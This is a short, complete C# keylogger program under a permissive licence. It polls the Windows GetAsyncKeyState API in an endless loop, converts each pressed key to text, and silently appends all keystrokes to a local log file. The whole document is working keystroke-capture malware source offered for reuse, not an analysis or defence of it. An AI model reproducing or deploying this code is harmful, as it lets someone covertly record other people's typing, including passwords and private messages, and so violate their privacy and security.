/* KeyLogger
 * This program is free software. It comes without any warranty, to
 * the extent permitted by applicable law. You can redistribute it
 * and/or modify it under the terms of the Do What The Fuck You Want
 * To Public License, Version 2.
 */

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        //Delay, used when no key is pressed to reduce cpu usage.
        const short Delay = 50;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static StringBuilder key = new StringBuilder();

        static void Main()
        {
            int keysCount = Enum.GetValues(typeof(Keys)).Length;//Get the number of avaible keys.

            while (true)
            {
                for (int i = 0; i < keysCount; i++)//Loop for every key.
                    if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
                        key.Append(Enum.GetName(typeof(Keys), i));//Add key to keys.

                //If no key is pressed, wait x milliseconds.
                if (key.Length <= 0) Task.Delay(Delay).Wait();
                else
                {
                    //Key is pressed, continue.
                    //Ingenore LButton and RButton, these are mouse clicks.
                    if (key.Equals("LButton") || key.Equals("RButton")) { key.Clear(); continue; }

                    key.Replace("Enter", Environment.NewLine);//Replace Enter with a new line.
                    key.Replace("Space", " ");//Replace Space with a real space.

                    File.AppendAllText("log.text", key.ToString());//Write key to log file.
                    key.Clear();
                }
            }
        }
    }
}
